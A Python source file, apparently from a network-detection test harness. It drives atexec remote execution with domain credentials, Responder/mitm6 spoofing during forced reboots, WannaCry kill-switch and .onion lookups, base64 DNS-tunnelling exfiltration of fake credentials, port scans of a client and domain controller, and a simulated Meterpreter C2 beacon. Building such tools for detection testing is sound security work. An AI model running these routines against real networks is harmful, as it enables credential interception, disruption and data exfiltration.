import multiprocessing
import os,sys,time
import random, base64, string, binascii, socket
from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime, date
from scapy.all import *
from bin import atexec
from bin import Responder
from bin import mitm6

def time_stamp():
	today = date.today()
	now = datetime.now()
	timestamp = today.strftime('%d %B %Y {}').format(now.strftime("%H:%M:%S"))
	return timestamp

def ipv6_spoof(spoof_domain,interface):
	mitm6.main(interface)

def ipv4_spoof(interface):
	Responder.main(interface)

def restart_req(domain,user,passw,target,spoof_domain):
	computer_acc = "".join(random.choices(string.ascii_uppercase,k=5)) + "03"
	timestamp = time_stamp()
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'powershell.exe -c "date;echo \'Restarting Client ...\'"','%s - Attempted To Spoof Client Domain Resolutions On Host Restart w/ Responder & Mitm6' % timestamp)
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'shutdown /r','')

def spoofnet(domain,user,passw,target,interface,spoof_domain):
	print('->[+] Starting MITM6 and Responder For Network Spoofing (~1m30s)')
	# Client Restart
	p = multiprocessing.Process(target=restart_req, name='Restart', args=(domain,user,passw,target,spoof_domain,))
	p.start()
	time.sleep(3)
	# Responder IPv6
	proc = multiprocessing.Process(target=ipv6_spoof, name='V6', args=(spoof_domain,interface,))
	proc.start()
	time.sleep(4)
	# Responder IPv4
	pr = multiprocessing.Process(target=ipv4_spoof, name='V4', args=(interface,))
	pr.start()
	time.sleep(83)
	if proc.is_alive():
		proc.terminate()
		proc.join()
	if pr.is_alive():
		pr.terminate()
		pr.join()
	if p.is_alive():
		p.terminate()
		p.join()
	os.system('rm ./bin/logs/*.txt 2>/dev/null')
	os.system('rm ./logs/Responder.log 2>/dev/null')

def mallookups(domain,user,passw,target,host,nameserver):
	print('->[+] Triggering WannaCry KillSwitch Domain Lookups')
	timestamp = time_stamp()
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'powershell.exe -c "nslookup ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com"', '%s - WannaCry KillSwitch Domain Lookups Performed From %s' % (timestamp,host))
	print('->[+] Legacy Onion Domain Lookup Leakage')
	on_domain = "".join(random.choices(string.ascii_lowercase + string.digits, k=56))
	timestamp = time_stamp()
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'powershell.exe -c "nslookup %s.onion"' % on_domain, '%s - Random Onion Domain Lookup Performed From %s' % (timestamp,host))
	print('->[+] Performing Exploit-DB and Kali Update Repo Lookup')
	timestamp = time_stamp()
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'powershell.exe -c "nslookup exploit-db.com; nslookup kali.download"', '%s - Exploit-DB and Kali Repo Lookup Performed From %s' % (timestamp,host))
	print('->[+] Performing Base64 DNS Tunnelling Simulation')
	timestamp = time_stamp()
	exfil_domain = "".join(random.choices(string.ascii_lowercase, k=15)) + "".join(random.choice(['.net','.org','.com','.co.uk']))
	file = open('./tools/names.txt','r')
	names = file.read().splitlines()
	file.close()
	log = open('./logs/debug_log.log','a')
	attack = open('./logs/attack_log.log','a')
	timestamp = time_stamp()
	log.write('\n\n%s - Simulating DNS Lookups with Base64 Content In Subdomain\n' % timestamp)
	attack.write('\n%s - Simulating DNS Lookups with Base64 Content In Subdomain\n' % timestamp)
	attack.close()
	for i in range(0,2):
		message = ('Users: Admin,' + " , ".join(random.choices(names,k=3)) + ' | Passwords: ' + " , ".join("".join(random.choices(string.ascii_lowercase + string.ascii_uppercase + '!' + '@' + '#' + '$' + '^' + '&' + '%' + '(' + ')' + string.digits, k=random.choice(list(range(8,18))))) for _ in range(0,4)) + ' | Numbers: ' + " , ".join(('0' + "".join(random.choices(string.digits,k=10)) for _ in range(0,4)))).strip('\n')
		message_array = message.split('|')
		for line in message_array:
			qdom = base64.b64encode(line.encode()).decode().replace('=','') + '.' + exfil_domain
			log.write('\n[*] DNS Exfil: ' + qdom)
			tid = int(binascii.b2a_hex(os.urandom(2)),16)
			packet = (IP(dst=nameserver)/UDP(sport=random.randint(1025,65500),dport=53)/DNS(rd=1,id=tid,qd=DNSQR(qname=qdom,qtype="A")))
			send(packet, verbose=0)
			time.sleep(2)
	log.close()

def portscan(target_client,target_dc):
	timestamp = time_stamp()
	file = open('./logs/debug_log.log','a')
	file.write('\n\n%s - PortScan Initiated Against Client and DC\n' % timestamp)
	hosts = [target_client,target_dc]
	ports = ['21','22','23','25','80','88','110','135','139','143','389','443','445','636','1433','3389','5985','8080','8081','9090']
	for host in hosts:
		file.write('\n\n[*] Host %s PortScan\n' % host)
		for port in ports:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.settimeout(1)
			result = sock.connect_ex((host, int(port)))
			if result == 0:
			        file.write("\n--->[*] Port %s : Open" % port)
			sock.close()

class handler(BaseHTTPRequestHandler):
	def do_GET(self):
		self.send_response(200)
		self.send_header('Content-type','application/octet-stream')
		self.end_headers()
	def do_POST(self):
		self.send_response(200)
		self.send_header('Content-type','application/octet-stream')
		self.send_header('Server','Apache')
		self.end_headers()

def http_srv(localport):
	with HTTPServer(('', localport), handler) as server:
		server.serve_forever()

def metbeacon(domain,user,passw,target,localip,localport):
	# Based on 2015 Snort Rule: "\/[a-z0-9]{4,5}_[a-z0-9]{16}\/"
	print('->[+] Attempting To Simulate Meterpreter C2 Beacon')
	uri = "".join(random.choices(string.ascii_lowercase + string.digits,k=random.choice([4,5]))) + '_' + "".join(random.choices(string.ascii_lowercase + string.digits,k=16))
	htsrv = multiprocessing.Process(target=http_srv, name='HTSRV', args=(int(localport),))
	htsrv.start()
	timestamp = time_stamp()
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'powershell.exe -c "Invoke-WebRequest -Body \'RECV\' -Method POST -Uri http://%s:%s/%s/ -UserAgent \'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\'"' % (localip,localport,uri), '%s - Default Meterpreter C2 Beacon Request Simulation Attempted From %s' % (timestamp,target))
	time.sleep(3)
	if htsrv.is_alive():
		htsrv.terminate()
		htsrv.join()
